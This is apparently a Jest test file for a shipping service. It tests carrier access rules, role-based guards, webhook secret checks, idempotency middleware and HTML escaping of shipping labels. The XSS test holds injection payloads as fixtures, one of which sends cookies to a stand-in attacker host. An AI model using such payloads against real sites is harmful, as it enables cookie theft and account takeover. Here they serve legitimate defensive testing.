const { createMockRes } = require('../testUtils');

describe('Milestone 3 Security, RBAC, Idempotency & Quality Assurance', () => {
    describe('F8: Shipment pricing and shipping access for MANUAL carrier', () => {
        const {
            normalizeShippingAccess,
            getServiceOptions,
            assertRequestedAccessAllowed
        } = require('../src/services/shippingAccess.service');

        it('normalizes manual mode into MANUAL carrier access shape', () => {
            const normalized = normalizeShippingAccess({ mode: 'manual' });
            expect(normalized).toEqual({
                mode: 'manual',
                carrierCode: 'MANUAL',
                serviceCode: null,
                serviceName: 'Manual Shipment'
            });
        });

        it('normalizes carrierCode MANUAL into manual mode', () => {
            const normalized = normalizeShippingAccess({ carrierCode: 'MANUAL' });
            expect(normalized).toEqual({
                mode: 'manual',
                carrierCode: 'MANUAL',
                serviceCode: null,
                serviceName: 'Manual Shipment'
            });
        });

        it('exposes MANUAL service options', () => {
            const options = getServiceOptions('MANUAL');
            expect(options).toEqual([{ serviceCode: null, serviceName: 'Manual Shipment' }]);
        });

        it('rejects carrier service codes for manual shipments with /does not allow/i', () => {
            const assigned = normalizeShippingAccess({ mode: 'manual' });
            expect(() => assertRequestedAccessAllowed(assigned, { serviceCode: 'EXPRESS' }))
                .toThrow(/does not allow/i);
        });
    });

    describe('F10: RBAC capability guards on ShipmentDraftService', () => {
        let prisma;
        let ShipmentDraftService;

        beforeEach(() => {
            jest.resetModules();
            prisma = {
                user: { findUnique: jest.fn() },
                shipment: { create: jest.fn(), findUnique: jest.fn().mockResolvedValue(null) }
            };
            jest.doMock('../src/config/database', () => ({ prisma }));
            ShipmentDraftService = require('../src/services/ShipmentDraftService');
        });

        it('blocks driver role from creating shipment drafts with 403', async () => {
            const driverUser = { id: 'driver-1', role: 'driver', name: 'Driver User' };
            const payload = {
                carrierCode: 'DGR',
                origin: { contactPerson: 'Sender' },
                destination: { contactPerson: 'Receiver' },
                parcels: [{ weight: 1 }]
            };

            await expect(ShipmentDraftService.createDraft(payload, driverUser))
                .rejects
                .toMatchObject({
                    statusCode: 403,
                    message: expect.stringMatching(/not authorized/i)
                });
        });

        it('allows client role with CREATE_SHIPMENTS capability to proceed past guard', async () => {
            const clientUser = {
                id: 'client-1',
                role: 'client',
                name: 'Client User',
                agentPolicy: { shippingAccess: { carrierCode: 'INTERNAL' } },
                organization: { id: 'org-1' }
            };
            prisma.user.findUnique.mockResolvedValue(clientUser);
            prisma.shipment.create.mockResolvedValue({ id: 'ship-1', trackingNumber: 'TGR-100', status: 'draft' });

            const payload = {
                origin: { contactPerson: 'Sender', formattedAddress: 'Origin St, Kuwait' },
                destination: { contactPerson: 'Receiver', formattedAddress: 'Dest Rd, Dubai' },
                parcels: [{ weight: 1 }]
            };

            const result = await ShipmentDraftService.createDraft(payload, clientUser);
            expect(result).toBeDefined();
            expect(result.trackingNumber).toBe('TGR-100');
        });
    });

    describe('F10: Webhook Authentication Fail-Closed Behavior', () => {
        let integrationController;
        let config;

        beforeEach(() => {
            jest.resetModules();
            config = require('../src/config/config');
        });

        it('fails closed on LogesTechs webhook when secret is not configured and ENFORCE_WEBHOOK_SECRETS is true', async () => {
            process.env.ENFORCE_WEBHOOK_SECRETS = 'true';
            config.logesTechsWebhookSecret = null;
            integrationController = require('../src/controllers/integration.controller');

            const req = { headers: {}, body: { packageId: '123' } };
            const res = createMockRes();

            await integrationController.handleLogesTechsWebhook(req, res);

            expect(res.status).toHaveBeenCalledWith(401);
            expect(res.json).toHaveBeenCalledWith(expect.objectContaining({
                ok: false,
                error: expect.stringMatching(/secret/i)
            }));

            delete process.env.ENFORCE_WEBHOOK_SECRETS;
        });

        it('rejects invalid secret on LogesTechs webhook', async () => {
            config.logesTechsWebhookSecret = 'correct-secret-123';
            integrationController = require('../src/controllers/integration.controller');

            const req = {
                headers: { 'x-logestechs-webhook-secret': 'wrong-secret' },
                body: { packageId: '123' }
            };
            const res = createMockRes();

            await integrationController.handleLogesTechsWebhook(req, res);

            expect(res.status).toHaveBeenCalledWith(401);
            expect(res.json).toHaveBeenCalledWith(expect.objectContaining({ ok: false }));
        });

        it('fails closed on Chatwoot webhook when secret is not configured and ENFORCE_WEBHOOK_SECRETS is true', async () => {
            process.env.ENFORCE_WEBHOOK_SECRETS = 'true';
            config.chatwoot = { webhookSecret: null };
            integrationController = require('../src/controllers/integration.controller');

            const req = { headers: {}, body: {} };
            const res = createMockRes();

            await integrationController.handleChatwootWebhook(req, res);

            expect(res.status).toHaveBeenCalledWith(401);
            expect(res.json).toHaveBeenCalledWith(expect.objectContaining({
                ok: false,
                error: expect.stringMatching(/secret/i)
            }));

            delete process.env.ENFORCE_WEBHOOK_SECRETS;
        });
    });

    describe('F11: Mandatory Idempotency Middleware', () => {
        let prisma;
        let idempotencyModule;

        beforeEach(() => {
            jest.resetModules();
            prisma = {
                idempotencyKey: {
                    findUnique: jest.fn(),
                    create: jest.fn(),
                    update: jest.fn()
                }
            };
            jest.doMock('../src/config/database', () => ({ prisma }));
            idempotencyModule = require('../src/middleware/idempotency.middleware');
        });

        it('returns 400 Bad Request when Idempotency-Key is missing and ENFORCE_IDEMPOTENCY is true', async () => {
            process.env.ENFORCE_IDEMPOTENCY = 'true';
            const { requireIdempotency } = idempotencyModule;
            const req = { headers: {}, user: { id: 'user-1' } };
            const res = createMockRes();
            const next = jest.fn();

            await requireIdempotency(req, res, next);

            expect(res.status).toHaveBeenCalledWith(400);
            expect(res.json).toHaveBeenCalledWith(expect.objectContaining({
                success: false,
                error: expect.stringMatching(/Idempotency-Key header is required/i)
            }));
            expect(next).not.toHaveBeenCalled();

            delete process.env.ENFORCE_IDEMPOTENCY;
        });

        it('returns 409 Conflict when an operation with the same key is currently PROCESSING', async () => {
            const { requireIdempotency } = idempotencyModule;
            const req = {
                headers: { 'idempotency-key': 'txn-uuid-1234' },
                user: { id: 'user-1' }
            };
            const res = createMockRes();
            const next = jest.fn();

            prisma.idempotencyKey.findUnique.mockResolvedValue({
                key: 'user-1:txn-uuid-1234',
                status: 'PROCESSING'
            });

            await requireIdempotency(req, res, next);

            expect(res.status).toHaveBeenCalledWith(409);
            expect(res.json).toHaveBeenCalledWith(expect.objectContaining({
                success: false,
                error: expect.stringMatching(/currently being processed/i)
            }));
            expect(next).not.toHaveBeenCalled();
        });

        it('replays cached response when operation is COMPLETED within cache window', async () => {
            const { requireIdempotency } = idempotencyModule;
            const req = {
                headers: { 'idempotency-key': 'txn-uuid-1234' },
                user: { id: 'user-1' }
            };
            const res = createMockRes();
            const next = jest.fn();

            prisma.idempotencyKey.findUnique.mockResolvedValue({
                key: 'user-1:txn-uuid-1234',
                status: 'COMPLETED',
                responseStatus: 201,
                responseBody: { success: true, trackingNumber: 'TRK-REPLAYED-99' }
            });

            await requireIdempotency(req, res, next);

            expect(res.status).toHaveBeenCalledWith(201);
            expect(res.json).toHaveBeenCalledWith({ success: true, trackingNumber: 'TRK-REPLAYED-99' });
            expect(next).not.toHaveBeenCalled();
        });

        it('creates a PROCESSING lock and passes through to next() on new key', async () => {
            const { requireIdempotency } = idempotencyModule;
            const req = {
                headers: { 'idempotency-key': 'txn-uuid-fresh' },
                user: { id: 'user-1' }
            };
            const res = createMockRes();
            const next = jest.fn();

            prisma.idempotencyKey.findUnique.mockResolvedValue(null);
            prisma.idempotencyKey.create.mockResolvedValue({});

            await requireIdempotency(req, res, next);

            expect(prisma.idempotencyKey.create).toHaveBeenCalledWith(expect.objectContaining({
                data: expect.objectContaining({
                    key: 'user-1:txn-uuid-fresh',
                    status: 'PROCESSING'
                })
            }));
            expect(next).toHaveBeenCalled();
        });
    });

    describe('F12: Stored XSS Mitigation in generateLabel', () => {
        let prisma;
        let shipmentOpsController;

        beforeEach(() => {
            jest.resetModules();
            prisma = {
                shipment: { findUnique: jest.fn() }
            };
            jest.doMock('../src/config/database', () => ({ prisma }));
            shipmentOpsController = require('../src/controllers/shipment-ops.controller');
        });

        it('HTML-escapes malicious scripts and onerror injection payloads in label generation', async () => {
            const maliciousShipment = {
                id: 'shipment-xss-1',
                trackingNumber: 'TRK-XSS-"><script>alert("pwned")</script>',
                status: 'booked',
                origin: {
                    contactPerson: '<script>fetch("https://attacker.com/cookie?c="+document.cookie)</script>',
                    company: '<img src=x onerror=alert(1)>',
                    formattedAddress: '<b onmouseover=alert("xss")>Evil Street</b>',
                    city: 'Kuwait City',
                    countryCode: 'KW',
                    phone: '99999999'
                },
                destination: {
                    contactPerson: '<svg/onload=alert(document.domain)>',
                    company: 'Safe Co',
                    formattedAddress: '123 Main St',
                    city: 'Dubai',
                    countryCode: 'AE',
                    phone: '88888888'
                },
                items: [],
                createdAt: new Date('2026-01-01')
            };

            prisma.shipment.findUnique.mockResolvedValue(maliciousShipment);

            const req = {
                params: { trackingNumber: 'TRK-XSS-1' },
                user: { id: 'admin-1', role: 'admin' }
            };
            let responseHtml = '';
            const res = {
                status: jest.fn().mockReturnThis(),
                send: jest.fn((html) => { responseHtml = html; })
            };

            await shipmentOpsController.generateLabel(req, res);

            expect(res.send).toHaveBeenCalled();
            // Raw unescaped script tags must NOT appear in HTML
            expect(responseHtml).not.toContain('<script>');
            expect(responseHtml).not.toContain('</script>');
            expect(responseHtml).not.toContain('<img src=x onerror=');
            expect(responseHtml).not.toContain('<svg/onload=');
            expect(responseHtml).not.toContain('<b onmouseover=');

            // Escaped entities MUST appear
            expect(responseHtml).toContain('&lt;script&gt;');
            expect(responseHtml).toContain('&lt;img src=x onerror=alert(1)&gt;');
            expect(responseHtml).toContain('&lt;svg/onload=alert(document.domain)&gt;');
        });
    });
});
